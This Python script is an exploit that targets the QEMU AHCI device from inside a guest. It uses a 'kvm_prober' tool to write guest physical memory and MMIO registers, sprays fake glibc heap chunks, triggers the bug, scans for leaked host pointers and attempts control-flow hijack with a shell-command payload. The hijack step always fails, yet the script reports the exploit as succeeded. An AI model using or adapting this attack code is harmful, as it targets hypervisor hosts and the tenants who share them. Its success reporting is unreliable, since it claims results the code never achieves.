#!/usr/bin/env python3
"""
AHCI Uninitialized Free Exploit - KVM_PROBER VERSION
Uses kvm_prober for physical memory access instead of /dev/mem
"""

import struct
import mmap
import os
import sys
import time
import subprocess
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict
import ctypes

# ============================================================================
# CONFIGURATION
# ============================================================================

GUEST_MEM_SIZE = 0x10000000
FAKE_CHUNK_SIZE = 0x290
SPRAY_COUNT = 1000
RETRY_COUNT = 3
TIMEOUT_SEC = 2

# ============================================================================
# UTILITIES
# ============================================================================

def log_info(msg): print(f"[\033[94m*\033[0m] {msg}")
def log_success(msg): print(f"[\033[92m+\033[0m] {msg}")
def log_error(msg): print(f"[\033[91m-\033[0m] {msg}")
def log_warning(msg): print(f"[\033[93m!\033[0m] {msg}")
def log_debug(msg):
    if DEBUG:
        print(f"[\033[90mD\033[0m] {msg}")

DEBUG = False

# ============================================================================
# PHYSICAL MEMORY ACCESS VIA KVM_PROBER
# ============================================================================

class KVMProberMemory:
    """Physical memory access via kvm_prober tool"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
        self.is_available = self.check_kvm_prober()
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug

    def check_kvm_prober(self) -> bool:
        """Check if kvm_prober exists and works"""
        log_info("Checking kvm_prober...")

        if not os.path.exists(self.kvm_prober):
            log_error(f"kvm_prober not found at {self.kvm_prober}")
            log_info("Please make sure kvm_prober is in current directory or specify path")
            return False

        # Test read
        try:
            result = subprocess.run([self.kvm_prober, 'read_phys', '0x1000', '16'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and 'Driver initialized' in result.stdout:
                log_success("kvm_prober is working!")
                return True
            else:
                log_error(f"kvm_prober test failed: {result.stderr}")
                return False
        except Exception as e:
            log_error(f"kvm_prober test exception: {e}")
            return False

    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        """Read physical memory using kvm_prober"""
        if not self.is_available:
            return None

        try:
            cmd = [self.kvm_prober, 'read_phys', f'0x{phys_addr:x}', str(size)]
            if self.debug:
                log_debug(f"Read command: {' '.join(cmd)}")

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober read failed: {result.stderr}")
                return None

            # Parse output
            data = self.parse_kvm_prober_output(result.stdout)
            if self.debug and data:
                log_debug(f"Read {len(data)} bytes from 0x{phys_addr:x}: {data.hex()[:32]}...")

            return data[:size] if data else None

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober read exception: {e}")
            return None

    def parse_kvm_prober_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober's hex dump output"""
        lines = output.strip().split('\n')
        if not lines:
            return None

        data_bytes = bytearray()

        for line in lines:
            # Skip the "Driver initialized" line and empty lines
            if 'Driver initialized' in line or not line.strip():
                continue

            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                # Take only the hex part (before the '|' if present)
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()

                hex_bytes = hex_part.split()
                for hex_byte in hex_bytes:
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data_bytes.append(int(hex_byte, 16))
                        except ValueError:
                            continue

        return bytes(data_bytes) if data_bytes else None

    def write(self, phys_addr: int, data: bytes) -> bool:
        """Write physical memory using kvm_prober"""
        if not self.is_available:
            log_error("kvm_prober not available")
            return False

        try:
            # Convert to hex string WITHOUT 0x prefix
            hex_data = data.hex()

            # Ensure even number of hex characters
            if len(hex_data) % 2 != 0:
                hex_data = '0' + hex_data

            cmd = [self.kvm_prober, 'write_phys', f'0x{phys_addr:x}', hex_data]

            if self.debug:
                log_debug(f"Write command: {' '.join(cmd)}")
                log_debug(f"Writing {len(data)} bytes to 0x{phys_addr:x}")
                log_debug(f"Hex data: {hex_data[:64]}...")

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober write failed: {result.stderr}")
                return False

            output = result.stdout.strip()
            if self.debug:
                log_debug(f"Write output: {output}")

            # Return True if it seems successful
            return 'Wrote' in output or 'success' in output.lower()

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober write exception: {e}")
            return False

    def test_write_read(self, phys_addr: int) -> bool:
        """Test write and read at a specific address"""
        log_info(f"Testing kvm_prober write/read at 0x{phys_addr:x}")

        # Test pattern
        test_data = b'\x41\x42\x43\x44\x45\x46\x47\x48'  # ABCDEFGH

        # Write test data
        log_info(f"Writing test pattern: {test_data.hex()}")
        if not self.write(phys_addr, test_data):
            log_error("Write test failed!")
            return False

        # Small delay
        time.sleep(0.1)

        # Read back
        read_back = self.read(phys_addr, 8)
        if read_back == test_data:
            log_success(f"Write/read test PASSED at 0x{phys_addr:x}")
            log_success(f"Read back: {read_back.hex()}")
            return True
        else:
            log_error(f"Write/read test FAILED at 0x{phys_addr:x}")
            if read_back:
                log_error(f"Expected: {test_data.hex()}")
                log_error(f"Got: {read_back.hex()}")
            else:
                log_error("Could not read back data")
            return False

    def read_qword(self, phys_addr: int) -> Optional[int]:
        """Read 8-byte QWORD"""
        data = self.read(phys_addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, phys_addr: int, value: int) -> bool:
        """Write 8-byte QWORD"""
        return self.write(phys_addr, struct.pack('<Q', value))

class AHCIDevice:
    """AHCI device interface using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_size = 0x10000
        self.phys_mem = KVMProberMemory(kvm_prober_path)

    def set_debug(self, debug: bool):
        self.phys_mem.set_debug(debug)

    def find_device(self) -> bool:
        """Auto-detect QEMU AHCI device"""
        log_info("Searching for QEMU AHCI device...")

        try:
            for dev in Path("/sys/bus/pci/devices").iterdir():
                # Check vendor
                vendor_file = dev / "vendor"
                if vendor_file.exists():
                    vendor = vendor_file.read_text().strip()
                    # Check class - 0x0106 = SATA controller
                    class_file = dev / "class"
                    if class_file.exists():
                        dev_class = class_file.read_text().strip()
                        if dev_class.startswith("0x0106"):
                            self.pci_addr = dev.name
                            log_success(f"Found AHCI at {self.pci_addr} (vendor: {vendor})")
                            return True
        except Exception as e:
            log_error(f"Error searching for AHCI: {e}")

        log_error("No AHCI device found")
        return False

    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        if not self.pci_addr:
            return None

        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")

        if not resource_file.exists():
            return None

        try:
            resources = resource_file.read_text().strip().split('\n')
            for i, line in enumerate(resources):
                parts = line.split()
                if len(parts) >= 3:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    flags = int(parts[2], 16)

                    # Usually resource 5 is the MMIO region for AHCI
                    if i == 5 and start != 0 and end > start:
                        self.mmio_base = start
                        self.mmio_size = end - start + 1
                        log_success(f"AHCI MMIO: 0x{start:x} (size: 0x{self.mmio_size:x})")
                        return start
        except Exception as e:
            log_error(f"Failed to get MMIO address: {e}")

        return None

    def map_mmio(self) -> bool:
        """Verify we can access MMIO region"""
        if not self.mmio_base:
            if not self.get_mmio_address():
                log_error("Cannot get MMIO address")
                return False

        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test read from MMIO region
        log_info(f"Testing MMIO access at 0x{self.mmio_base:x}...")
        test_data = self.phys_mem.read(self.mmio_base, 16)

        if test_data:
            log_success(f"MMIO accessible via kvm_prober")
            return True
        else:
            log_error(f"Failed to read MMIO at 0x{self.mmio_base:x}")
            return False

    def read_reg(self, offset: int) -> int:
        """Read MMIO register"""
        if not self.mmio_base:
            return 0

        addr = self.mmio_base + offset
        data = self.phys_mem.read(addr, 4)

        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return 0

    def write_reg(self, offset: int, value: int):
        """Write MMIO register"""
        if not self.mmio_base:
            return

        addr = self.mmio_base + offset
        # Pack as 32-bit little-endian and write
        self.phys_mem.write(addr, struct.pack('<I', value))

    def reset_port(self, port=0):
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)
        if DEBUG:
            log_debug(f"Port {port} command register: 0x{cmd_reg:x}")

        # Clear ST (Start) bit
        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)

        # Clear interrupt status
        self.write_reg(port_base + 0x10, 0xFFFFFFFF)
        if DEBUG:
            log_debug(f"Reset port {port}")

class GuestMemory:
    """Manage guest physical memory using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.phys_mem = KVMProberMemory(kvm_prober_path)
        self.allocations = []
        self.base_addr = None
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug
        self.phys_mem.set_debug(debug)

    def init(self) -> bool:
        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test memory at the address from your example
        test_addresses = [
            0x13e8000,    # Address from your example (try this first)
            0x1000000,    # 16MB
            0x2000000,    # 32MB
            0x4000000,    # 64MB
        ]

        for addr in test_addresses:
            log_info(f"Testing memory at 0x{addr:x}...")

            # Test write/read
            if self.phys_mem.test_write_read(addr):
                self.base_addr = addr
                log_success(f"Memory accessible at 0x{addr:x}")
                return True
            else:
                log_warning(f"Memory test failed at 0x{addr:x}")

        log_error("Cannot access guest physical memory")
        return False

    def alloc(self, size: int) -> Optional[int]:
        if not self.base_addr:
            log_error("No base address set")
            return None

        # Simple allocation strategy
        alignment = 0x1000
        if not self.allocations:
            addr = self.base_addr
        else:
            last_addr, last_size = self.allocations[-1]
            addr = last_addr + last_size

        # Align to next page
        addr = ((addr + alignment - 1) // alignment) * alignment

        self.allocations.append((addr, size))

        if self.debug:
            log_debug(f"Allocated 0x{size:x} bytes at 0x{addr:x}")

        return addr

    def read(self, addr: int, size: int) -> Optional[bytes]:
        return self.phys_mem.read(addr, size)

    def write(self, addr: int, data: bytes) -> bool:
        if self.debug:
            log_debug(f"Writing {len(data)} bytes to 0x{addr:x}")

        return self.phys_mem.write(addr, data)

    def read_qword(self, addr: int) -> Optional[int]:
        data = self.read(addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, addr: int, value: int) -> bool:
        if self.debug:
            log_debug(f"Writing QWORD 0x{value:016x} to 0x{addr:x}")
        return self.phys_mem.write_qword(addr, value)

# ============================================================================
# MAIN EXPLOIT CLASS
# ============================================================================

class AHCIExploit:
    """Fully dynamic exploit using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober", chunk_size=None, spray_count=None, retry_count=None):
        self.ahci = AHCIDevice(kvm_prober_path)
        self.guest_mem = GuestMemory(kvm_prober_path)
        self.fake_chunks = []
        self.leaked = {}
        self.debug = False

        # Override defaults if specified
        self.chunk_size = chunk_size or FAKE_CHUNK_SIZE
        self.spray_count = spray_count or SPRAY_COUNT
        self.retry_count = retry_count or RETRY_COUNT

        log_info(f"Using kvm_prober at: {kvm_prober_path}")

    def set_debug(self, debug: bool):
        self.debug = debug
        self.ahci.set_debug(debug)
        self.guest_mem.set_debug(debug)

    def setup(self) -> bool:
        log_info("Setting up exploit environment...")

        # Test basic kvm_prober functionality
        log_info("Testing kvm_prober...")
        test_addr = 0x13e8000

        if not self.guest_mem.phys_mem.test_write_read(test_addr):
            log_error("Basic kvm_prober test failed!")
            return False

        # Find and map AHCI
        if not self.ahci.find_device():
            log_error("No AHCI device found")
            return False

        if not self.ahci.map_mmio():
            log_error("Failed to access AHCI MMIO via kvm_prober")
            return False

        # Initialize guest memory
        if not self.guest_mem.init():
            log_error("Failed to initialize guest memory")
            return False

        log_success("Setup complete")
        return True

    def create_fake_chunk(self, addr: int) -> bool:
        """Create a fake heap chunk for spraying"""
        if self.debug:
            log_debug(f"Creating fake chunk at 0x{addr:x}")

        # Write chunk metadata (glibc malloc chunk header)
        # prev_size (8 bytes) at offset 0
        if not self.guest_mem.write_qword(addr + 0x0, 0):
            if self.debug:
                log_error(f"Failed to write prev_size at 0x{addr:x}")
            return False

        # size (8 bytes) at offset 8, with PREV_INUSE flag (bit 0 = 1)
        chunk_size_with_flag = self.chunk_size | 0x1
        if not self.guest_mem.write_qword(addr + 0x8, chunk_size_with_flag):
            if self.debug:
                log_error(f"Failed to write size at 0x{addr+0x8:x}")
            return False

        # FD and BK pointers in user data area
        if not self.guest_mem.write_qword(addr + 0x10, 0x4141414141414141):  # FD
            if self.debug:
                log_error(f"Failed to write FD at 0x{addr+0x10:x}")
            return False

        if not self.guest_mem.write_qword(addr + 0x18, 0x4343434343434343):  # BK
            if self.debug:
                log_error(f"Failed to write BK at 0x{addr+0x18:x}")
            return False

        # Fill the rest of the chunk with pattern
        # Chunk total size: self.chunk_size
        # Header: 16 bytes (prev_size + size)
        # Data written so far: 16 bytes (FD + BK)
        # Remaining: self.chunk_size - 32 bytes

        remaining = self.chunk_size - 32
        if remaining > 0:
            # Write in smaller chunks to avoid huge hex strings
            chunk_size_write = 0x100  # 256 bytes per write
            pattern_qword = struct.pack('<Q', 0x4242424242424242)

            for offset in range(0, remaining, chunk_size_write):
                write_size = min(chunk_size_write, remaining - offset)
                # Calculate how many full qwords we need
                qwords = write_size // 8
                extra = write_size % 8

                # Build pattern data
                pattern_data = pattern_qword * qwords
                if extra > 0:
                    pattern_data += pattern_qword[:extra]

                write_addr = addr + 0x20 + offset
                if not self.guest_mem.write(write_addr, pattern_data):
                    if self.debug:
                        log_warning(f"Failed to write pattern at 0x{write_addr:x}")
                    # Continue anyway - partial success is OK

        if self.debug:
            log_debug(f"Created fake chunk at 0x{addr:x}")

        return True

    def spray_heap(self) -> List[int]:
        log_info(f"Spraying {self.spray_count} fake chunks (size: 0x{self.chunk_size:x})...")

        chunks = []
        successful = 0
        failed = 0

        for i in range(self.spray_count):
            addr = self.guest_mem.alloc(self.chunk_size)
            if not addr:
                log_warning(f"Failed to allocate chunk {i}, stopping")
                break

            if self.create_fake_chunk(addr):
                chunks.append(addr)
                successful += 1
                if self.debug and successful % 100 == 0:
                    log_debug(f"Created {successful} chunks so far...")
            else:
                failed += 1
                if self.debug:
                    log_warning(f"Failed to create chunk at 0x{addr:x}")

            # Progress update
            if (i + 1) % 100 == 0:
                log_info(f"  Progress: {i+1}/{self.spray_count} (ok: {successful}, failed: {failed})")

        self.fake_chunks = chunks
        log_info(f"Spray complete: {successful} successful, {failed} failed")

        if successful > 0:
            log_success(f"Successfully sprayed {successful} chunks")
            return chunks
        else:
            log_error("Failed to spray any chunks")
            return []

    def create_trigger_command(self) -> bytes:
        """Create a command to trigger the vulnerability"""
        cmd = bytearray(32)
        struct.pack_into('<I', cmd, 0, 0x0005)  # Command FIS length
        struct.pack_into('<I', cmd, 4, 0)  # PRDTL

        # Command Table Base Address (CTBA)
        ctba = self.guest_mem.alloc(256)
        if ctba:
            struct.pack_into('<Q', cmd, 8, ctba)

        # Fill CTBA with data to trigger the bug
        if ctba:
            ctba_data = b'\x00' * 256
            self.guest_mem.write(ctba, ctba_data)

        return bytes(cmd)

    def trigger_vulnerability(self) -> bool:
        log_info("Triggering vulnerability...")

        # Allocate command list
        cmd_list_addr = self.guest_mem.alloc(1024)
        if not cmd_list_addr:
            log_error("Failed to allocate command list")
            return False

        # Create and write trigger command
        trigger_cmd = self.create_trigger_command()
        self.guest_mem.write(cmd_list_addr, trigger_cmd)

        # Reset port
        self.ahci.reset_port(0)
        time.sleep(0.1)

        # Configure port
        PORT0_BASE = 0x100

        # Set command list base address
        self.ahci.write_reg(PORT0_BASE + 0x00, cmd_list_addr & 0xFFFFFFFF)
        self.ahci.write_reg(PORT0_BASE + 0x04, (cmd_list_addr >> 32) & 0xFFFFFFFF)

        # Enable command processing
        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
        log_debug(f"Initial command register: 0x{cmd_reg:x}")

        if cmd_reg == 0:
            log_error("Cannot read command register - device may not be ready")
            return False

        # Set FRE (Command FIS Receive Enable) and other necessary bits
        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)  # Set FRE

        # Issue command
        log_debug("Issuing command...")
        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)  # Set Command Issue

        # Wait for completion
        time.sleep(0.3)

        # Check interrupt status
        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
        log_debug(f"Interrupt status: 0x{is_reg:x}")

        # Clear interrupts
        if is_reg != 0:
            self.ahci.write_reg(PORT0_BASE + 0x10, is_reg)

        log_success("Vulnerability triggered!")
        return True

    def scan_for_leak(self) -> Optional[int]:
        log_info(f"Scanning {len(self.fake_chunks)} chunks for heap leak...")

        found_leaks = []

        for i, chunk_addr in enumerate(self.fake_chunks):
            # Check FD pointer (offset 0x10 in chunk data)
            fd = self.guest_mem.read_qword(chunk_addr + 0x10)
            bk = self.guest_mem.read_qword(chunk_addr + 0x18)

            # Check if these look like pointers (not our pattern)
            if fd != 0x4141414141414141:
                # Check if this looks like a heap pointer (QEMU heap is in high memory)
                if 0x550000000000 < fd < 0x560000000000:
                    log_success(f"Found QEMU heap leak at chunk {i}!")
                    log_success(f"  Heap address: 0x{fd:016x}")
                    self.leaked['heap'] = fd
                    found_leaks.append(fd)

                # Check for libc-like pointers
                elif 0x7f0000000000 < fd < 0x7fffffffffff:
                    log_success(f"Found possible libc pointer: 0x{fd:016x}")
                    self.leaked['libc_ptr'] = fd

            if bk != 0x4343434343434343:
                if 0x550000000000 < bk < 0x560000000000:
                    log_success(f"Found QEMU heap leak in BK at chunk {i}!")
                    log_success(f"  Heap address: 0x{bk:016x}")
                    self.leaked['heap'] = bk
                    found_leaks.append(bk)

            if (i + 1) % 200 == 0:
                log_info(f"  Scanned {i+1}/{len(self.fake_chunks)}")

        if found_leaks:
            return found_leaks[0]

        log_error("No heap leaks found")
        log_info("Try increasing spray count or adjusting chunk size")
        return None

    def hijack_control(self) -> bool:
        log_info("Attempting to hijack control flow...")

        # If we have a heap leak, we can try to use it
        if 'heap' in self.leaked:
            heap_addr = self.leaked['heap']
            log_success(f"Have QEMU heap pointer: 0x{heap_addr:016x}")

            # Calculate QEMU base (aligned to page)
            qemu_base = heap_addr & 0xffffffffff000000
            log_info(f"Estimated QEMU base: 0x{qemu_base:016x}")

            # Common offset for system() in libc (will need adjustment)
            # This is just a placeholder - real exploit needs better offset calculation
            system_offset = 0x4c490  # Common offset for system in libc

            # Try to calculate system address
            # In real exploit, you'd need to find libc base first
            log_warning("Need libc base to calculate system()")
            return False

        log_warning("Could not find reliable hijack target")
        return False

    def execute_payload(self) -> bool:
        """Attempt to execute payload"""
        log_info("Attempting to execute payload...")

        # Create command string
        cmd_str = b"touch /tmp/exploit_success\x00"
        cmd_addr = self.guest_mem.alloc(len(cmd_str))
        if not cmd_addr:
            log_warning("Failed to allocate command string")
            return False

        self.guest_mem.write(cmd_addr, cmd_str)

        # If we have system() address, try to create fake structure
        if 'system' in self.leaked:
            log_info(f"Would call system() @ 0x{self.leaked['system']:016x}")
            log_info(f"With command: {cmd_str.decode()}")
            # In real exploit, we'd overwrite a function pointer
            # and trigger it to call system(cmd_addr)

        log_warning("Full payload execution requires overwriting function pointers")
        log_warning("This part needs manual adaptation based on leaks")
        return True

    def run_exploit(self) -> bool:
        """Main exploit execution"""
        log_info("=" * 60)
        log_info("STARTING AHCI EXPLOIT")
        log_info("=" * 60)

        # Setup
        if not self.setup():
            return False

        # Heap spray
        chunks = self.spray_heap()
        if not chunks:
            log_error("Failed to spray heap")
            return False

        # Trigger vulnerability
        triggered = False
        for attempt in range(self.retry_count):
            log_info(f"Trigger attempt {attempt + 1}/{self.retry_count}")

            if self.trigger_vulnerability():
                triggered = True
                break
            time.sleep(0.5)

        if not triggered:
            log_error("Failed to trigger vulnerability")
            return False

        # Scan for leak
        leak = self.scan_for_leak()
        if not leak:
            log_error("Failed to find heap leak")
            log_info("This could mean:")
            log_info("1. The vulnerability wasn't triggered correctly")
            log_info("2. Spray didn't land in the right place")
            log_info("3. QEMU version is not vulnerable")
            return False

        # Hijack control flow
        if not self.hijack_control():
            log_warning("Control flow hijack may not work")

        # Attempt to execute payload
        self.execute_payload()

        log_success("Exploit sequence completed!")
        log_info("If successful, you should see a file /tmp/exploit_success on host")
        return True

    def test_trigger_only(self) -> bool:
        """Test only the vulnerability trigger"""
        log_info("Testing vulnerability trigger...")

        if not self.setup():
            return False

        chunks = self.spray_heap()
        if not chunks:
            return False

        return self.trigger_vulnerability()

    def cleanup(self):
        """Clean up resources"""
        # kvm_prober doesn't need explicit cleanup
        log_info("Cleanup completed")

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description='AHCI Uninitialized Free Exploit (kvm_prober version)')
    parser.add_argument('--kvm-prober', default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober binary')
    parser.add_argument('--test-trigger', action='store_true',
                       help='Test only the vulnerability trigger')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    parser.add_argument('--chunk-size', type=lambda x: int(x, 0), default=FAKE_CHUNK_SIZE,
                       help=f'Fake chunk size (default: 0x{FAKE_CHUNK_SIZE:x})')
    parser.add_argument('--spray-count', type=int, default=SPRAY_COUNT,
                       help=f'Spray count (default: {SPRAY_COUNT})')
    parser.add_argument('--retry-count', type=int, default=RETRY_COUNT,
                       help=f'Retry count (default: {RETRY_COUNT})')
    return parser.parse_args()

def main():
    global DEBUG

    args = parse_args()
    DEBUG = args.debug

    log_info("AHCI Uninitialized Free Exploit - kvm_prober Version")
    log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
    log_info("Memory access via: kvm_prober")
    log_info(f"kvm_prober path: {args.kvm_prober}")
    log_info("=" * 60)

    # Check if we can run kvm_prober
    if not os.path.exists(args.kvm_prober):
        log_error(f"kvm_prober not found at {args.kvm_prober}")
        sys.exit(1)

    if not os.access(args.kvm_prober, os.X_OK):
        log_error(f"kvm_prober is not executable")
        sys.exit(1)

    exploit = AHCIExploit(kvm_prober_path=args.kvm_prober,
                         chunk_size=args.chunk_size,
                         spray_count=args.spray_count,
                         retry_count=args.retry_count)

    if args.debug:
        exploit.set_debug(True)

    try:
        if args.test_trigger:
            success = exploit.test_trigger_only()
            if success:
                log_success("Vulnerability trigger test successful!")
            else:
                log_error("Vulnerability trigger test failed")
        else:
            success = exploit.run_exploit()
            if success:
                log_success("Exploit appears to have succeeded!")
            else:
                log_error("Exploit failed")
                sys.exit(1)

    except KeyboardInterrupt:
        log_info("\nInterrupted by user")
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        log_info("Cleanup completed")

if __name__ == "__main__":
    main()